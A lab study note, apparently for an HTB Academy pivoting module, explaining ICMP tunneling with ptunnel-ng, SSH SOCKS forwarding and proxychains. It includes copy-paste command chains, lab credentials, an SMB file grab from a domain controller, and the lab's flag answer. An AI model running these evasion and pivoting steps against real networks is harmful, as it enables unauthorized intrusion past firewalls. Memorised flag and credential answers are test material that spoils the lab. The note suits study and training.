# 14 — ICMP Tunneling with SOCKS (ptunnel-ng)

> Ptunnel-ng encapsulates TCP traffic inside ICMP echo requests/replies. If a firewall blocks all TCP/UDP but allows ping, ICMP tunneling lets you pivot over it. Requires root on both ends.

---

## How It Works

```
Attack Host  [ptunnel-ng client — listens on TCP :2222]
    │  TCP traffic encapsulated in ICMP echo requests
    ▼
Ubuntu Pivot  [ptunnel-ng server — accepts ICMP, forwards to TCP :22]
    │  decapsulates ICMP → real SSH connection on port 22
    ▼
SSH session on pivot → dynamic port forward (-D 9050) → proxychains → internal network
```

After the ICMP tunnel is up, you SSH into it on local port 2222, which looks like a normal SSH session to the pivot — but all traffic flows as ICMP packets.

---

## When to Use

- TCP and UDP are blocked by egress/ingress firewall rules
- ICMP (ping) responses ARE permitted through the firewall
- You need to tunnel traffic out via a protocol that isn't inspected

---

## Setup — Build ptunnel-ng

**Option A — Standard build (requires matching glibc on target):**
```bash
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sudo ./autogen.sh
```

**Option B — Static binary (recommended — avoids glibc mismatch):**
```bash
sudo apt install automake autoconf -y
git clone https://github.com/utoni/ptunnel-ng.git
cd ptunnel-ng
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.sh
./autogen.sh
# binary at ptunnel-ng/src/ptunnel-ng
```

**Transfer repo to pivot:**
```bash
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  -r ~/ptunnel-ng ubuntu@PIVOT_IP:~/
```

---

## Step 1 — Start ptunnel-ng Server on Pivot

```bash
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22
```

- `-r` — IP the server accepts connections on (pivot's external/reachable IP)
- `-R22` — port to forward incoming tunnel traffic to (SSH port on pivot)

Confirms running: `[inf]: Ping proxy is listening in privileged mode.`

---

## Step 2 — Connect ptunnel-ng Client on Attack Host

```bash
sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22
```

- `-p` — pivot IP (where ptunnel-ng server is running)
- `-l2222` — local TCP port on attack host to listen on
- `-r` — same as server's `-r` (pivot IP)
- `-R22` — same as server's `-R` (SSH port)

Confirms running: `[inf]: Relaying packets from incoming TCP streams.`

---

## Step 3 — SSH Through the ICMP Tunnel

```bash
ssh -p2222 -lubuntu 127.0.0.1
```

Traffic flows: `127.0.0.1:2222` → ptunnel-ng client → **ICMP** → ptunnel-ng server → `pivot:22`

---

## Step 4 — Dynamic Port Forward Through ICMP Tunnel (Optional)

Add `-D 9050` to the SSH command to create a SOCKS proxy through the tunnel:

```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
```

Then use proxychains (configured to `socks4 127.0.0.1 9050`) to reach internal hosts:

```bash
proxychains nmap -sV -sT 172.16.5.19 -p3389
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
```

---

## Parameter Reference

| Parameter | Side | Meaning |
|-----------|------|---------|
| `-r IP` | Server | IP the server listens/accepts ICMP on (pivot's external IP) |
| `-R PORT` | Server | TCP port to forward decapsulated traffic to (22 = SSH) |
| `-p IP` | Client | Pivot IP where ptunnel-ng server is running |
| `-l PORT` | Client | Local TCP port on attack host (SSH to this to use tunnel) |
| `-r IP` | Client | Must match server's `-r` |
| `-R PORT` | Client | Must match server's `-R` |

---

## Traffic Verification (Wireshark)

To confirm traffic is flowing as ICMP (not raw TCP):

| Connection method | Traffic visible in Wireshark |
|-------------------|------------------------------|
| `ssh ubuntu@10.129.202.64` (direct) | TCP + SSHv2 |
| `ssh -p2222 -lubuntu 127.0.0.1` (via tunnel) | ICMP echo request/reply only |

The ptunnel-ng server also prints session statistics:
```
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
```

---

## Full Copy-Pastable Chain

**Attack host — build static binary and transfer:**

```bash
# Build static ptunnel-ng
sudo apt install -y automake autoconf
git clone https://github.com/utoni/ptunnel-ng.git ~/ptunnel-ng
cd ~/ptunnel-ng
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j$(nproc) all/' autogen.sh
./autogen.sh

# Transfer to pivot
PIVOT_IP=10.129.202.64
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  -r ~/ptunnel-ng ubuntu@$PIVOT_IP:~/
```

**Pivot — start server:**
```bash
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@$PIVOT_IP \
  'sudo ~/ptunnel-ng/src/ptunnel-ng -r'$PIVOT_IP' -R22' &
sleep 3
```

**Attack host — start client:**
```bash
sudo ~/ptunnel-ng/src/ptunnel-ng -p$PIVOT_IP -l2222 -r$PIVOT_IP -R22 &
sleep 2
```

**SSH + dynamic forward through ICMP tunnel:**
```bash
ssh -D 9050 -p2222 -lubuntu 127.0.0.1
# Password: HTB_@cademy_stdnt!
```

**From a new terminal — proxychains through the tunnel:**
```bash
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:'pass@123' /cert:ignore /dynamic-resolution
proxychains nmap -sT -Pn -p3389,445,22 172.16.5.19
```

---

## Triage

| Symptom | Fix |
|---------|-----|
| `./ptunnel-ng: no version information available (libselinux)` | Normal warning — tool still works |
| `ptunnel-ng` crashes on pivot after transfer | glibc mismatch — build static binary using the `sed` trick above |
| `Permission denied` starting server | Needs `sudo` — ICMP requires raw sockets (root) |
| SSH on `127.0.0.1:2222` hangs | ptunnel-ng client not running or wrong `-p`/`-r` IP |
| Tunnel established but proxychains fails | Check proxychains4.conf: must have `socks4 127.0.0.1 9050` and `-D 9050` active |
| ICMP blocked from pivot to attack host | This method won't work — switch to TCP-based tunneling (Chisel, SSH -D) |

---

## Key Takeaways

1. **Requires root on both ends** — ICMP raw sockets need root privileges.
2. **`-r` and `-R` must match** on server and client — they describe what the server is forwarding to.
3. **ICMP replaces the transport layer** — normal SSH, proxychains, etc. work identically once the tunnel is up.
4. **Static binary avoids glibc headaches** — always build with `LDFLAGS=-static` for transfer to targets.
5. **Add `-D 9050` to the SSH command** for a SOCKS proxy through the ICMP tunnel — gives full internal network access via proxychains.
6. **Wireshark shows only ICMP** — no TCP signatures, making it difficult for network-level detection.

---

## Lab Solution — Section 14 Skills (May 8, 2026)

**Pivot host:** `10.129.202.64` (ACADEMY-PIVOTING-LINUXPIV) — IP changes per spawn
**Pivot creds:** `ubuntu : HTB_@cademy_stdnt!`
**Internal target:** `172.16.5.19` — DC, `victor : pass@123`

> Wait 3–5 minutes after spawn before attempting.
> Note: glibc versions must match between attack host and pivot — use static binary if standard build fails.

### Q1 — Use ICMP tunnel to reach DC, read C:\Users\victor\Downloads\flag.txt → `N3Tw0rkTunnelV1sion!`

> **Note:** The actual file on disk is `flag.txt.txt` (double extension) — `flag.txt` returns not found.

**Intended path (ptunnel-ng):**
```bash
PIVOT_IP=10.129.202.64

# 1. Build static ptunnel-ng and transfer
sudo apt install -y automake autoconf
git clone https://github.com/utoni/ptunnel-ng.git ~/ptunnel-ng
cd ~/ptunnel-ng
sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j$(nproc) all/' autogen.sh
./autogen.sh
sshpass -p 'HTB_@cademy_stdnt!' scp -o StrictHostKeyChecking=no \
  -r ~/ptunnel-ng ubuntu@$PIVOT_IP:~/

# 2. Start server on pivot
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@$PIVOT_IP \
  "sudo ~/ptunnel-ng/src/ptunnel-ng -r$PIVOT_IP -R22" &
sleep 3

# 3. Start client on attack host
sudo ~/ptunnel-ng/src/ptunnel-ng -p$PIVOT_IP -l2222 -r$PIVOT_IP -R22 &
sleep 2

# 4. SSH + SOCKS through ICMP tunnel
ssh -D 9050 -p2222 -lubuntu 127.0.0.1

# 5. From another terminal — grab flag via SMB
proxychains smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
  -c 'get Users\victor\Downloads\flag.txt.txt /tmp/flag14.txt' && cat /tmp/flag14.txt
```

**Faster path (chisel — if ptunnel-ng build fails):**
```bash
# Chisel binary already on pivot from section 13
sshpass -p 'HTB_@cademy_stdnt!' ssh -o StrictHostKeyChecking=no ubuntu@$PIVOT_IP \
  './chisel server -v -p 1234 --socks5' &
sleep 4
/tmp/chisel client -v $PIVOT_IP:1234 socks &
sleep 4

proxychains4 -q -f <(echo -e "[ProxyList]\nsocks5 127.0.0.1 1080") \
  smbclient //172.16.5.19/C$ -U 'victor%pass@123' \
  -c 'get Users\victor\Downloads\flag.txt.txt /tmp/flag14.txt' && cat /tmp/flag14.txt
```

**Flag:** `N3Tw0rkTunnelV1sion!`

---

## References

- Previous: [13-SOCKS5_Tunneling_with_Chisel.md](13-SOCKS5_Tunneling_with_Chisel.md)
- Next: [15-RDP_and_SOCKS_Tunneling_with_SocksOverRDP.md](15-RDP_and_SOCKS_Tunneling_with_SocksOverRDP.md)
- ptunnel-ng GitHub: https://github.com/utoni/ptunnel-ng
